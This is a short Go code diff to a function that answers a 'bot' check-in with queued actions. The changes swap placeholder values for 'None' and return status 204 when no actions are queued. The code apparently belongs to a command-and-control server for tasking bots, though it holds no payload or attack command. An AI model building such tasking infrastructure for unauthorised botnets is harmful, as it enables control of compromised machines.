@@ -227,12 +227,12 @@ func botCheckinUtil(prot *mcs.MCS) (int32, []*mcs.Action) {
 	}
 	if len(acts) == 0 {
 		actProto := &mcs.Action{
-			Uuid: "abcd",
+			Uuid: "None",
 			Mode: "None",
-			Args: "efgh",
+			Args: "None",
 		}
 		actList = append(actList, actProto)
-		return 200, actList
+		return 204, actList
 	}
 	for _, actn := range acts {
 		aUUID := actn.UUID
